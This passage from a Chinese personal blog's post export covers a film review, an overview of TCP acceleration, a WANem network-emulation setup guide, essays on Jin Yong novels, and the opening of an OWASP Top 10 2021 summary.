影片的第一个出彩之处，是使用了很多的伏笔，且这些伏笔都进行了巧妙的回收。\n齐乐山的刀，是他去过印度的证据，刀上的弹孔，是案发被捕时海兆丰走火留下的。\n海兆丰在现场触发了一次闪光灯，其实是偷偷地拍下了自己和偶像（梦蝶）的合影，而他临死之际，将胶卷交给了梦蝶，最后在报纸上刊发了出来。\n被裁开的画可以作为支撑物登上通风口，这一手法在柯南中是提到过的。\n在看夜莺的海报时，梦蝶曾说她戴的是假发，这个假发在通风管道中被找出来了，为什么在通风管道中？在第一版”真相“中，夜莺被肢解，齐乐山将假发丢弃在管道中；在第二版真相中，夜莺没有死，假发应该是她在通风管道中爬行时掉落了。\n齐乐山讲到了夜莺为国王驱除死神的故事，而夜莺这个人确实驱除了死神，她没有死。\n海兆丰在众人慌乱时竟然失手把枪掉落了，这样还叫什么神枪手呢？在最后我们知道，他是个文职。\n齐乐山为什么仔细看报，舞厅的选票是什么，李家辉在管道中听到的冲水声是什么，这些细节都回收了。\n还有其他的一些伏笔，总之是精巧的。\n我的感想 我最大的感想，不是情节如何的巧妙，不是故事本身如何的反转之反转，而是三老与夜莺，是那个时代的最大的悲剧。\n在那样吃人的时代之中，一个靠自己的美貌与能力奋斗而成为名人的夜莺，算得上什么呢？三老是什么？三老是地主阶级、买办大资本阶级的代表，他们把持了中国大部分的资源而无恶不作，看似风光的夜莺，在这个阶级面前没有任何尊严可言，遑论其他的劳苦众生。一个夜莺的尊严，被齐乐山以死捍卫了，其悲痛的故事被埋葬在火海之中了，而千千万万个夜莺的尊严，没人捍卫，她们的痛苦，没人理睬，有的只是滚滚而去的时光和历久弥新的创伤而已。那年的政府是个什么政府呢？从南京来的”踩灭火苗的人“，显然不代表正义。\n我想，故事最悲痛的地方即是那个年代最悲痛的地方。三老这样的人、夜莺这样的事发生在中国的大地上，齐乐山精心营造的这样的反转之反转，无比惨烈。故事最伟大的地方，就是让我感到革命之伟大，只要这样的故事少了，这样精巧而无奈的反转之反转不要了，那末中国的大地就干净了，就向着毛主席说的”十个没有“前进了。\n看完了这部作品，在被三老的恶和夜莺齐乐山的悲压得透不过气来之后，我无比地憧憬毛主席说的那个”一没有贪官污吏，二没有土豪劣绅，三没有赌博，四没有娼妓，五没有小老婆，六没有叫花子，七没有结党营私之徒，八没有萎靡不振之气，九没有人吃摩擦饭，十没有人发国难财“的世界。\n我的其次的感想，是希望顺着编剧和导演的思想，把扬名立万这个题目体会清楚。我想，扬名立万是故事开始的动机，是故事推进的动力，是故事结局的概括。这些演员在最后扬名立万了吗？我希望是的，他们所揭示的那个年代的三老的罪行，作为一个典型将永远地流传下去，将作为人民革命的警示牌，矗立在那个虚拟的文艺界上。\n我最大的希望，就是希望中国大地上不要再出现任何一个三老，不要再出现任何一个的”踩灭火苗的人“。让无产阶级在夜莺的歌唱中，埋葬所有的三老吧！死亡不属于无产阶级！\n","date":"2021-11-26T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%A7%82%E6%89%AC%E5%90%8D%E7%AB%8B%E4%B8%87/","title":"观《扬名立万》"},{"content":"传输控制协议（TCP）是我们的老朋友了，它力求在不可靠的IP网络上实现可靠的数据传输，也就是使得数据包有序、无丢失和不重复，因此，引入了如校验、序号、确认、重传等机制。同时，这位老朋友也是比较负责任的，在网络拥挤时，为了不使情况雪上加霜，它引入了慢启动、拥塞避免等机制。\n现在的网络世界中，我们日常进行的网页浏览、游戏、视频等活动都离不开TCP。随着网络的发展，网络上面承载的数据包越来越多，在为多数人所共享的广域网上，在人们上网的高峰期，网络会存在一定的拥塞，反映到我们的上网体验上，就是延迟和丢包。加载个网页要花掉十几秒、玩个王者荣耀时不时延迟200+、看视频卡顿等，除了设备的问题，恐怕网络拥塞难辞其咎。在这样的背景之下，TCP加速技术也就产生和发展了。\n实际上，TCP加速也不是一个新的概念了，十几年前就有相关的研究，但是这一理念在现今的背景下显得较有意义，我们对其进行一些学习和实践，大概不算是浪费时间的。\n两种方案 TCP加速可以从几个角度来进行分类，较为常见且易懂的是从加速方案的部署位置来分。如果只在客户/服务器的某一边来部署TCP加速，就叫做 单边加速 ，如果双方都要部署，就叫做 双边加速 。两种方案一般有不同的使用场景，单边加速常部署在服务端上，这样就能透明地提升用户的访问体验；双边加速常常是双方协商好的一套加速方案，因此不能做到透明，可以用在客户端和服务端都可控的场景中，比如在个人云服务器上运行着某项服务，此时可以在自己的客户端PC和服务端都部署TCP加速，来改善访问体验。\n单边加速概述 单边加速方案只需要由客户或服务端的一方来部署，比较简单，且对对方是透明的。我们首先要知道TCP是怎么工作的：在 协议规定 的运行模式下，发送方的系统 产生和处理数据 、 把数据交给网卡 、网卡发送数据，接收方接收数据、把数据交给系统、处理数据。从这一套流程中，我们应该发现几个可以下手的地方，每个地方都尝试一下，我们对TCP加速的认识也就差不多了。\n数据包处理优化 说是数据包处理优化，其实就是所谓的“网络性能优化”。这个概念跟TCP协议本身没有太多关系，主要是针对收发数据双方的硬件、操作系统等进行优化。\n减少复制 按照上面说过的流程，发送方的系统要产生和处理数据，然后把数据交给网卡。这一步是一个复制的过程，也就是将数据从系统或者应用程序所在的内存空间复制了一份到网卡的内存空间。这一步是可以优化的，有下面这几种办法。\n直接访问网卡存储空间 。这种方案取消了复制，而采用地址映射或直接访问的办法，相当于将网卡看作了操作系统的一部分。为了实现这种方案，网卡要具备一定的智能性，否则无法支持多应用的访问，也无法在合适的时机传递数据。\n与网卡共享存储区域 。让网卡用DMA或其他什么方式来访问内核内存空间，比上面的方案简单一些，对网卡的要求少一些。\n其他各种内存映射方案 。内存映射可以实现应用、网卡和内核三者的内存共享，无论是什么内存映射方案，核心都是减少复制。\n减少中断 系统要把数据交给网卡，或者网卡收到数据要交给系统的时候，一般都会触发中断。操作系统处理中断是需要花费时间的，因此这一步也是可以优化的。\n将异步触发变为轮询 。有些研究者将TCP/IP的处理放置到一台单独的设备上，这样，就可以将协议数据的收发处理由中断的方式改变为比较简单的系统轮询。轮询的频率是要仔细调整的，太慢则数据处理产生延迟，太快则系统负载过大。\n中断合并 。中断合并就是将多个中断合并到一起处理，也就是不在每次收到数据时产生中断，而是在数据积累到一定的量时再产生一次中断。这种方案使得延迟跟报文长度有关系了，且在处理数据的时候可能一次处理了多个报文，应用程序的调度也受到一些影响。\n增加单个报文的长度 。思想和中断合并是类似的，就是将报文数据积累到一定长度再发送。但这一步是交给上层协议来完成的，跟中断合并时有区别的。\n报文过滤 。总会有一些报文是没意义的，比如一些广播数据、一些没用的UDP报文，这些数据直接交给网卡来过滤，就能够减少中断。\n用户级传输协议 传统的协议处理是在用户空间内完成的，因此要减少复制，只能引入各种内存映射或共享的方案。人们可以在用户空间实现传输层的协议，节省了数据复制的时间。\nTCP卸载引擎 将软件执行转移到硬件执行，一直是性能优化的不二法门。如果在网卡硬件上运行一些特殊的系统，使得数据处理等步骤直接由网卡完成，那末系统的负载就小了，执行起来就快了。\nTCP卸载引擎的缺点是存在的，那就是网卡硬件性能的提升要与系统其他硬件保持同步，否则还是可能成为传输速度的瓶颈；当然，要在网卡上实现数据处理的系统，本身的硬件和软件的设计难度也是很大的。\n协议细节优化 数据包处理优化实际上就是针对机器本身的“网络性能优化”，而协议细节的优化才真正关乎TCP协议本身。\n拥塞控制优化 TCP的拥塞控制机制我们是熟悉的，那就是：慢启动、拥塞避免（加法增加、乘法减少）。其实在这两个机制的基础上，延伸出的快重传和快恢复也属于拥塞控制的优化，当然我们还要有更多的尝试。\n针对拥塞状态的判断 。我们如何判断网络是否拥塞呢？TCP协议一般以超时和重复ACK为标准。超时意味着不仅自己的数据没有到达，对方的重复ACK也没有到达，网络的拥塞情况已经比较严重了，因此传统的处理方法是将发送窗口减到 1 ，阈值减半，重新开始慢启动。重复ACK意味着自己的数据没有到达，对方的ACK可以到达，网络的拥塞情况还不那么严重，因此传统的处理方法是将阈值减半，发送窗口减到阈值大小，重新加法增加。慢启动和加法增加都是保守的，对带宽不一定有充分的利用，尤其当网络出现了小波动的时候，如果误判为拥塞，就会导致传输速度骤降，而带宽空闲。\n有若干种针对拥塞状态的判断方案，例如zetaTCP使用了动态学习的方法判断拥塞，过滤非拥塞情况引起的丢包现象，预判拥塞丢包的概率并基于这一概率直接重传。Fast TCP结合延迟信息反馈来判断拥塞，Westwood结合带宽测量的技术来判断拥塞。\n参数调节 TCP协议的参数是指预先写好的、控制协议工作的一些参数，如用于进行拥塞避免的拥塞窗口阈值，用于传输数据的MTU，用于判断超时的超时时间等。针对这些参数进行仔细的调节，可以一定程度达到TCP加速的目的。\n并行TCP 并行TCP的理念是将原本的一条TCP连接修改为多条TCP连接，将原本使用一条连接来传输的数据放在多条连接上传输。这种思路归根到底是对拥塞避免算法的改造，原本一条连接上的拥塞避免算法，其强度在改为多条连接之后得到了削弱。例如原本的拥塞窗口是 N ，改成 k 条连接之后就成了 kN ，每次在拥塞避免时还是只把阈值减少 N/2 ，对总的窗口的影响就没那么大了。\n双边加速——以UDP Speeder为例 双边加速要求在客户端和服务端都部署相同的加速方案，常规思路是把复杂的TCP协议转化为私有的协议。使用私有协议，可以对数据包处理、重传/拥塞避免等机制进行调整，从而达到加速的目的。\n以开源的 UDP Speeder 为例，该系统在客户-服务器之间架设了一条隧道，在隧道中传输的数据使用了前向纠错编码，使得数据即便在传输过程中产生了一些错误和丢失，也能通过冗余的编码数据来把原始数据恢复过来。\n在客户端，UDP Speeder会开放一个监听端口，监听用户给到的数据；会开放一个发送端口，用于把数据发送到远端服务。监听端口收到数据之后，首先进行编码等处理，然后将数据通过发送端口发送出去。\n在服务端，UDP Speeder也会开放一个监听端口，监听来自广域网的数据；根据收到的数据管理连接，每个连接对应一个独立的发送端口，用于把该连接的数据发送给服务程序。监听端口收到广域网传来的数据后，首先进行解码，纠错/恢复传输过程中收到影响的部分，然后送到该连接对应的发送端口，发送给服务程序。\n从UDP Speeder中，我们看到双边TCP加速的基本理念，就是针对数据进行一个双方协商好的处理，其目的是提高带宽的利用效率，减少不必要的数据重传等。UDP Speeder只能实现针对UDP数据的加速，但是配合基于UDP的VPN程序，如Open VPN等，可以实现对TCP的加速。\n我对UDP Speeder的源码进行了分析，如果希望更加细致的了解它的工作流程，下面的两张图可以起到帮助：\n客户端 服务端 参考资料 [1] 王圣,苏金树.TCP加速技术研究综述[J].软件学报,2004,15(11):1689-1697\n[2] 王建新,彭娜.广域网加速技术研究综述[J].技术交流.2009,5\n[3] 钟琳华.深度解析ZetaTCP单边加速技术[J].技术研发.2015\n[4] David X. Wei,Cheng Jin,Steven H. Low, et al.FAST TCP: Motivation, Architecture, Algorithms,Performance[J].IEEE/ACM TRANSACTIONS ON NETWORKING,2006,14(6):1246-1258\n[5] Giuseppe Siracusano,Roberto Bifulco,Simon Kuenzer et al.On-the-Fly TCP Acceleration with Miniproxy[J].Extended version of paper published in ACM HotMiddlebox.2016,5.\n[6] Tom Kelly.Scalable TCP: Improving Performance in Highspeed Wide Area Networks[J].2002,12.\n[7] 蒋建军,陆平.基于 TCP 协议加速的单边加速模型研究与实现[J].信息技术,2015(2):160-164\n[8] 林睿.基于 4G 核心网透明代理进行 TCP加速的效果分析[J].通信设计与应用.2020,2.\n[9] 彭娜.并行TCP在广域网加速系统中的研究与实现[D].中南大学.2009.\n[10] 赵欣,时向泉,吴纯青.支持TCP/IP卸载引擎的协议栈的设计与实现[J].微电子学与计算机,2006(S1)\n[11] S.Floyd.RFC.3649.HighSpeed TCP.2003\n","date":"2021-11-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/tcp%E5%8A%A0%E9%80%9F%E6%8A%80%E6%9C%AF%E7%AE%80%E8%BF%B0/","title":"TCP加速技术简述"},{"content":"我们可能遇到这样的情景：有一些实验需要在广域网环境下（存在一定的延迟、丢包等）完成，但我们不希望花费成本去租借一台云服务器，只希望在虚拟机网络中模拟出广域网的环境，应该如何实现呢？\n本文是TCP加速系列总结的一部分 ，我们希望完成TCP加速的实验，这时要求我们的实验环境不仅是一个广域网，还需要是一个存在 一定拥塞 、会发生 一定丢包 的广域网，这种情况下，如果我们不使用模拟环境，而使用真实服务器的话，实验效果就可能受到服务器地理位置、实验时间段等等因素的影响了。\n好在，我们可以使用WANem这一稳定、易用的广域网模拟器来解决我们的问题。\n简介 WANem基于iptables和tc（Traffic Control）实现，可以实现对网络延迟、丢包率、抖动、噪音等的模拟，使用者可以简单地设定并复现出某个特定的网络环境，因而逐渐替代软件仿真成为新一代的网络测试床。与之具备类似概念的工具有微软的Network Emulator for Windows Toolkit（NEWT）、Linux 2.6自带的Netem等。事实上，此前说的tc（Traffic Control）就是用来控制Netem工作的，因此可以理解为WANem是基于Netem所构建。\n安装与访问 WANem类似于一台虚拟机，可以直接 下载 iso文件，并在VMWare中安装。Linux类型选择 其他Linux 64位 即可。\n启动之后，可以使用DHCP获取IP，或者手动配置IP；虚拟机会要求你设置口令，你可以使用用户名 perc 和你设置的口令来远程登录到系统上。\n成功启动之后，会出现 WANemControl@PERC\u0026gt; 的命令行提示符，使用 help 命令可以查看该命令行支持的命令。\n一般来说，你现在就可以在另一台机器的浏览器上使用 http://\u0026lt;WANem IP\u0026gt;/WANem 来访问控制界面了（注意URL大小写）。假如你不知道WANem的IP地址，则使用 exit2shell 命令来返回到Linux命令行中，使用我们熟悉的 ip addr 命令就可以看到WANem的IP。\n成功访问WANem 配置规则 首次进入控制界面时，我们看到的是WANem的 Basic Mode ，这个模式下，我们可以配置 带宽 和 延迟 。\n点击导航栏中的 Advanced Mode 进入高级配置，我们看到如下的界面：\nAdvanced Mode 界面上已经将各项指标都标识得比较清楚了，因此不多费口舌解释。在上图中，我们已经写好了一条”延迟100ms、随机丢包率20%“的规则。\n可以指定我们的规则的适用范围，如果你只希望你配置的规则在两台特定主机之间生效，那么就填写下图红框框出的一行，否则保留原样即可。\n规则 使用 保存我们设置好的规则，即刻开始使用它吧。\n我们的两台实验机器分别是 CentOS7 192.168.213.128 和 Ubuntu 192.168.213.129 ，WANem是 192.168.213.130 。\n首先可以使用 iperf3 来测试一下两台机器之间的网络情况（理所当然地好）。\n在Ubuntu上运行 iperf3 -s 命令：\niperf server 在CentOS上运行 iperf3 -c 192.168.213.129 命令，该工具将会自动测试从客户端到服务端的带宽情况：\niperf client 接着，我们引入WANem。在CentOS上添加路由，使得它到Ubuntu的所有流量都要经过WANem。\n添加路由 再次使用 iperf3 -c 192.168.213.129 进行测试，效果很明显：\niperf client 可以看到，首先由于时延的影响，带宽下降了，其次是产生了一些丢包。\n我们可以使用 iperf3 -u -c 192.168.213.129 命令来启用UDP模式，该模式下会统计丢包率，可以看到这里的丢包率跟我们此前设置的 20% 是接近的。\niperf UDP 综上所述，有了这个环境，就可以愉快地在局域网中模拟出广域网环境了。\n参考资料 [1] 微信测试工程师手把手教你做弱网络模拟测试 - 知乎\n[2] Linux网络流量控制工具—Netem - 发卡 - 博客园 (cnblogs.com)\n[3] TC(Traffic Control)命令—linux自带高级流控 - 云+社区 - 腾讯云 (tencent.com)\n[4] 彭娜.并行TCP在广域网加速系统中的研究与实现[C].中南大学硕士学位论文,2009-05\n[5] https://sourceforge.net/projects/wanem/files/Documents/WANemv11-Setup-Guide.pdf/\n","date":"2021-11-23T00:00:00Z","permalink":"https://xrg.fj.cn/p/tcp%E5%8A%A0%E9%80%9F%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAwanem/","title":"TCP加速之环境搭建（WANem）"},{"content":"距离我废寝忘食地读完《倚天屠龙记》不到两周，我又以相同的热情读完了《连城诀》。\n自我读完《倚天》之后，便暗自下决心少读金庸小说，第一是因为金庸先生的小说实在写得精彩，很容易使我不去做其他事情而专门来读，第二是金庸先生的小说总是包含很深长的意味，读完之后总是如饮烈酒，思绪震荡。\n我在中学时几乎读遍了金庸小说，最喜欢的几本中便有一本《连城诀》。读完《倚天》之后便把《连城诀》加入到我的电子书库中，不出十天，便翻开了第一页，翻开之后，两天的时间内便整本读完了。\n《连城诀》几乎是金庸小说中最现实的一本，它的情节之压抑，令人觉得自己仿佛不是在读武侠小说。小说淋漓尽致地展现了人性中的”贪“，叙述了由贪念引出的一系列不公平事，几乎是直指着苍天的鼻子，质问着何为”善有善报，恶有恶报“。\n故事的核心正是《连城诀》，这是一本武功秘籍，也是一份巨大宝藏的索引。然而，主角狄云的悲惨命运的起点，与这本书并无关系。师徒三人从乡下来到万震山的家中为他贺寿，万家八名弟子对戚芳见色起意，设计将狄云陷害成强奸未遂的淫徒，使他右手五指被削、穿了琵琶骨、关入死囚狱中。在这里，狄云认识了丁典，当狄云知道师妹将要嫁给仇人之后，试图自杀，从此取得了丁典的信任。狄云初步习得了丁典的《神照经》，而在一个雨夜中，丁典意识到自己深爱的女子已经逝世，带着狄云越狱前去确认她的死活，受到了知府凌退思的暗算，亦踏上了黄泉。狄云承接了丁典与凌霜华合葬的遗愿，开启了江湖上的游荡生涯。他带着丁典的尸身在机缘巧合下来到万家，见到了戚芳，与万圭冲突，被戚芳所救，又受到宝象僧的追击，在破寺中侥幸毒死宝象，火化了丁典，又遇到铃剑双侠和血刀老祖，被一系列巧合裹挟着来到西域雪谷，眼见血刀老祖击败江南三侠、受到血刀老祖的毒手、冲开任督二脉、与花铁干和水笙周旋、最终众人进入雪谷、与水笙一同遭到众人的误会、开启了新一段的漂泊。故事进入最后一大部分，是狄云从雪谷中出来之后，见到言达平、解救万圭、与戚芳同时知晓万家的毒计、眼见戚芳死亡、追寻言达平来到宝藏所在的地方、眼见众人因为抢夺财宝而全部死伤、最后万念俱灰回到了雪谷，见到了水笙。我在中学时候，正是天真烂漫的年纪，对甚么明争暗斗的情节完全没有任何的理解，只觉得水笙对狄云从最初的厌恶、到误会的消除、再到最后见到狄云的欣喜，这样的转变真是令人非常欣慰的，因此对这一部书还蛮喜欢；如今，我从前所觉得无关紧要的那些情节，突然变得无比真实、无比血淋淋的，从前最欢喜的情节，倒成为了两个蒙受大冤之人的一笔简单结尾，并不十分地令人振奋了。\n现下读来，整个故事基本没有令人大感愉悦的部分，没有快意恩仇、没有行侠仗义、没有男女暧昧、没有家国情怀，《连城诀》就是单纯地描写了众人如何受到心中贪念的驱使、而加入一场场狠毒的暗算、闹哄哄的抢夺中。在这一环套一环的心计下，全书中最憨厚老实的狄云受到了无数不明不白的冤屈，且最终也没有正式地将这些冤屈洗清。其实，在狄云心中，这些冤屈的洗清，大抵已经不重要了，他心爱敬重的人一个接一个地死去、或显露出狰狞的面貌，一个人受到打击如此，如何还会去在意万两黄金、沉冤昭雪呢？\n不知在哪里见到过一句话：“《连城诀》是金庸小说中最为现实主义的一部”。的确，相比于正气凛然、善恶得报的其他武侠作品，这部书中只有无尽的暗算和冤屈，使得读者不禁要质问上苍：这样的世界你不要管管么？然而质问是无力的，我们在现实的世界中，何尝少了勾心斗角、明枪暗箭，何尝见到人恶天收、人善天佑呢？相比于我从《倚天屠龙记》中读到的家国、善恶、男女等等一系列的主题，《连城诀》的主题可单调许多，单只有从人性中的”贪“所引发的思考，其深远和分量却毫不逊色了。\n","date":"2021-10-22T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E8%BF%9E%E5%9F%8E%E8%AF%80/","title":"再读《连城诀》"},{"content":"概言 《倚天屠龙记》是一部好作品。\n距离上一篇读书小记已有半年多了，这半年并非全无读书，而是读了大部头而还未读完（《三国演义》），或者读了论述类的书（《乡土中国》）而尚未理解得很深刻，自然没有办法产出什么读书感想。\n其实，我从以前就说我不大喜欢读小说，尤其是长篇小说，这点后面一定要讲讲。\n言归正传，从我再一次翻开《倚天屠龙记》，到我看完最后一页而无比怅然，只花了三四天的时间。犹记得中学时期，学校总是强调不要看武侠小说，甚至在武侠小说之前加上了“沉迷”二字，俨然将其视为了一种猛烈上瘾的毒药；这几天下来，颇不认同。小说就是小说，小说都是写人物的、讲故事的，不应有“沉迷某某小说”这种针对性的表达。所谓“沉迷”，只能是作者把人物写得太生动了，把故事讲得太精彩了，使读者流连于小说的世界之中，但是既然如此，“沉迷”武侠小说，和“沉迷”四大名著、“沉迷”外国经典，也就没有多大的区别了。\n我先说“沉迷”武侠小说的说法是错误的，但我这几天确实是“沉迷”了，沉迷在在这片快意恩仇的江湖里，甚至没有心思抽出身来打打游戏。\n我想《倚天屠龙记》之精彩，其一在于“大情”和“小情”的调和，这是文意方面；其二在于金庸先生对人物的塑造，一个个角色都是有血有肉的，他们的嬉笑怒骂如在眼前，读者并不是以冷酷的第三者的身份来看完整篇故事，而是仿佛跟随在这些人物身边去目睹一切了。\n中学时看过几遍《倚天屠龙记》，但年岁渐长，心境也不同往日。旧时的记忆只限于跟张无忌相关的部分，这次重读，半生半熟之间自然有新的感悟。\n全书可以分为几个大的部分，张无忌成年以前的部分均为铺垫，张翠山和殷素素相识相恋、冰火岛等情节尤其精彩；张无忌回归中土之后，幼年时期的情节单列一部分，此时的无忌完成了从天真纯粹到初尝世事的转变，他父母的自尽、身受玄冥神掌之后被太师傅带着四处求医、蝴蝶谷的生活、带着不悔妹妹的漫漫西行之路、受了朱家的欺骗……身处乱世，这样的经历不可不谓命途多舛，但张无忌始终承受下来了，一次次的磨砺都带着一次次的机缘，与周芷若的相识、一身医术的修成，都在此时。\n第三部分是光明顶解围。修成九阳神功之后，在光明顶结识小昭、练成乾坤大挪移、力服六大派，而成为明教教主。这部分是张无忌人生中的第一个高光，实则也是全书中“大情”的第一次体现：学武之人应当胸襟开阔，江湖各派应该精诚团结、共克外敌。光明顶一战，无人不服这一年轻而高尚的侠士。\n第四部分是解救群雄。光明顶之后，蒙古势力介入捡漏，各大派人物为赵敏所擒。张无忌先到少林，后到武当，于武当山顶学会了太极，十分漂亮地解了一次围。而后万宁寺一战，救出群豪，也是精彩。这一部分，张无忌与赵敏相识，而后情愫暗生，成为全文“小情”的重要部分。这一部分是周芷若命运的转折点，由于灭绝师太心中那无法放下的成见，使得一位少女早早结束了她天真可爱的时期，而被迫修练城府，终于带来一场凌乱的冲突，十分可悲可叹。\n第五部分是出海与归来。张无忌一行人前往灵蛇岛，在那岛上寻得谢逊、与波斯总教产生矛盾、与小昭东西永隔、回程时殷离身死、赵敏受冤……这部分是“小情”的主舞台，张无忌与四个女子之间剪不断理还乱的情感，使得我在看这一部分时相当痛苦。与波斯人的冲突最终还是稍逊一筹，小昭被迫成为总教教主，远赴波斯，从此永别（在小说中永别了），殷离身死、赵敏蒙冤，张无忌的情感聚焦到了周芷若和谢逊身上。我先前已说了，所谓“沉迷”其中，是指情节和语言精彩绝伦，使读者如同目睹一切，感受一切；然则我也亲历了张无忌与四女的情感波折，四段感情迫于外力一段段地终了，最终剩下与周芷若的情感，也没有一个清晰的界定，真是愁死人也。\n第五部分是再回中土之后，与周芷若的冲突、与赵敏的重逢、多次营救谢逊、共抗元兵、携手归隐。这部分是文章的最后一部分，也是“大情”和“小情”的高潮。在这部分，张无忌将“小情”理出了头绪，即先义父、后男女，主赵敏、副他人。为救义父，不惜与赵敏一同离开婚礼现场，与周芷若彻底冲突；而随着营救进程的发展，无忌也认清了自己心中真正所爱的角色是赵敏。这部分是全文中第二次聚集天下英杰，元兵的到来也使得武林人士精诚团结、共抗外敌，是“大情”的又一次集中表达。\n大情 我认为一篇小说当中不应该只有小情。\n这里的大情，是指对人物关系之外的、更高一级的问题的思考和体现。《倚天屠龙记》当中至少体现了两个深刻的问题：\n正与邪的对立统一。 主与次的矛盾冲突。 从张翠山和殷素素的关系开始，就在表达一个问题：正与邪是绝对对立的吗？殷素素是天鹰教的公主，原本杀人不眨眼，但为情所动，成为了一个温柔的妻子、温柔的母亲，这样的人，能称之为邪吗？\n谢逊的转变，赵敏的转变，均是邪转为正的例子；何太冲原本也是一派掌门，贪念一起，便始终纠结于谢逊与屠龙刀，甚至于光明顶偷袭失败而刺死了华山派掌门、夜晚私闯关押谢逊的地方而被渡劫三人击败、被成昆杀死，这是正转为邪的例子。其实，书中的人物均是灰度的，以正邪为白黑，张三丰和成昆为两个极端的人物，其余人物几乎都亦正亦邪。张无忌一身正气，也难免对四女贪心不足，情感纠缠不清，是大正而小邪；赵敏是害苦了俞岱岩等人的幕后黑手，而也难逃男女之情的影响，向张无忌代表的正方靠拢过去；明教诸人更不必提，总是以邪魅手段行正义之事，倒也有趣。\n主与次的矛盾冲突是另一个大问题。文章的背景是元末，主要矛盾其实是朝廷与百姓、与江湖群侠的冲突，其余江湖各派、派内各种人物的冲突，是次要的。但是全文基本以次要矛盾为核心，没有过多地呈现当时的主要矛盾，或者说主要矛盾只存在于诸人的豪言壮语中，这是受到了题材的限制。讲带兵打仗、驱除胡虏，不讲内功外劲、江湖恩怨，这武侠小说便没东西可写。但是在次要矛盾之中，处处体现主要矛盾，各派之间争斗之时，总有人试图将这些斗争消融掉，呼吁各方团结起来对付元朝；在朱元璋对张无忌施压的内部斗争情节中，也有人呼吁以抗击外虏为主。最后各方终于团结在少室山上，共同抵御元兵，是次要矛盾转向主要矛盾的一次升华。\n主次矛盾在各方的视角当中是不一样的。从第三者视角来看，当然是恢复失地、推倒暴虐的朝廷为要；代入各派中的人物来看，主要矛盾却是杀害师兄弟的不共戴天之仇敌，这也无可厚非。着眼大局、放下私人恩怨是一种修为，不能强调所有人都要有这种修为，这种局部视角下的主要矛盾其实是灭绝师太身死、周芷若悲剧的一个重要成因。\n其实，正与邪的对立统一也应当属于诸多矛盾中的一种。我在这里说的第一点强调的是“对立和统一”，第二点强调的是“主要和次要”，并不属于重复。\n至于从前的阅读理解题里面常常说的“歌颂了人物的某某性格”、“反映了某某高贵品质”云云，但凡成点气候的小说，便不会不突出人物的性格品质，写在这里是浪费笔墨。\n小情 小情实则不小，相反，乃是使人物丰满之关键。没有小情，小说里写出来的便是木头而不是人了，但相比于宏观的、较大的问题，人物身上所系的一些情感，只能称之为小情。\n《倚天屠龙记》的后记当中讲到，这一部小说主要强调的不是男女之情，而是江湖当中的好友、师长之情。在我读来，其实二者的含量是差不多的，好友、师长之情描述虽多，而其味不浓，男女之情虽然一直并不直接地表达出来，但寥寥几个情节便令人如饮烈酒，思绪无穷。\n好友、师长之情确实是一大重点。张无忌和太师傅、和明教当中的教众、和谢逊，都有非常不一般的情谊，张三丰和张翠山、或者武当七侠之间的情感，亦不逊色。男人是很向往这样的情感的，而武侠小说所描绘的这类情感很多，因此在固有的印象中，学生时期痴迷于武侠小说的群体中还是男生较为多一些。\n男女之情的部分则当真是千回百转。张翠山和殷素素好一对天作之合！张无忌和小昭、赵敏、周芷若，殷离和她心中的那个小鬼……这一类感情真是非常复杂，无论是喜是悲读起来都使人非常惆怅。寻常作品当中写男女之情，能有一二缕复杂关系，便叫人难以把持，而书中若干对男女被金庸先生刻画得如此生动，不愧是一代大师。\n我想在这一部分中，谈谈我对这部作品的总体感受和一些其他的联想。\n此前已讲过，《倚天屠龙记》是大情和小情交融在一起的，恰如那阴阳并济的九阳真气那样，很醇厚。小说是要有这样的水平，才堪称好作品；《三国演义》如没有始终怀抱“兴复汉室、还于旧都”愿望的蜀汉，便是三派军阀混战，无甚特别的魅力，这部作品中凌驾于个人之上的大情是家国情怀、君臣之义。读者总是希望从作品中读出一些情节之外的东西，如此感悟才深、回味才隽永。\n小说是以小情结尾的，周芷若要求张无忌不跟赵敏拜堂成亲，但不反对他们做夫妻，原文写道：\n张无忌奇道：“你这样跟我们为难，有什么用意？”周芷若嫣然一笑，说道：“你们尽管做夫妻、生娃娃，过得十年八年，你心里就只会想着我，就只不舍得我，这就够了。”说着身形晃动，飘然远去，没入黑暗之中。\n这样作为落幕，好不厚道，留下的空间实在太大，回味实在太多；我昨晚读完全书，犹如饮下一杯极苦极苦的浓茶，一直到深夜都还辗转反侧，全放不下对这几个人的牵挂，讲不清是一种什么感觉。\n很开始的时候便说：我是比较不喜欢读小说，尤其是长篇小说的。我们既然要读书，便该读佳作，既是佳作，便是其中一个微不足道之人物，也被作者用深厚的功底刻画得栩栩如生，更休提主角。读完一本长篇小说，便是与主角一道生活了好几天，想主角之所想，见主角之所见，他的喜怒哀乐只在眼前，对这个人物的情感已是很深；读完全本，合上书页，这个人物便是“飘然远去，没入黑暗之中”，于我来说，不是读完了一本书，而是失去了一个极好的朋友，怅怅然不知所措。“早知如此绊人心，何如当初莫相识”，正是我不喜欢读长篇小说的原因了。\n","date":"2021-10-10T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E5%80%9A%E5%A4%A9%E5%B1%A0%E9%BE%99%E8%AE%B0/","title":"再读《倚天屠龙记》"},{"content":"2021版本的OWASP Top10已经出炉，目前处于同行评审阶段。本博客上已有2017版本的归纳总结，考虑到后面几年时间内，该版本（2021版）的Top10将可能对行业产生较大的影响，现单列一篇，总结其内容。\n截至本文发布，该版本已经定稿\n0 总览 新版本相较于2017版，引入了3个新类别（Insecure Design、Software and Data Integrity Failures、SSRF），修改了原有4个类的名称，以及进行了一些类别的整合。\n变化 这一版Top10综合考虑了大数据和行业调查的结果；由于安全人员需要对大数据分析得到的漏洞进行验证和测试，为了保证结论的与时俱进，该机构对一线安全人员进行了问卷调查，由他们来对大数据分析的结果进行补充。\n1 Broken Access Control 失效的访问控制 是原榜单的 No. 5 ，现在来到了第一位。在 秋招 | 一些知识点 (gitee.io) 这篇文章中已经对这一安全问题进行了解释，在此不妨再重复一遍。\n访问控制策略使得所有用户都只能在其对应的权限之下行动，而失效的访问控制将导致未授权信息的读取、修改、销毁，或导致用户执行其权限之外的功能函数。一般的访问控制漏洞包括以下几点：\n攻击者可以通过修改URL、应用内部状态、HTML页面或使用API攻击工具来绕过访问控制检查； 允许攻击者将数据库主键设置为其他用户，从而导致查看或修改其他用户的信息； 提权。未登录时能够执行已登录用户的操作，或已登录用户执行管理员操作； 